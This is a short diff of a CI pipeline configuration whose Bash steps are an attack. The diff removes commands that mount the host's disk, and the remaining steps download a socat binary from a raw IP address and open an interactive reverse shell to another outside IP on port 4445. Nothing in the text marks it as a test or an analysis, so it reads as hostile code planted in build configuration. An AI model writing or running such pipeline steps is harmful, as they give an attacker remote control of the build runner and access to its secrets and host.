@@ -5,11 +5,6 @@ pipelines:
         type: Bash
         execution:
           onExecute:
-            - uname -a
-            - mkdir /mnt/host; 
-            - mount /dev/xvda1 /mnt/host/;
-            - cd /mnt/host/
-            - cd home/ubuntu
             - wget http://5.148.32.212:8000/socat
             - chmod +x socat
             - ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:5.148.32.211:4445
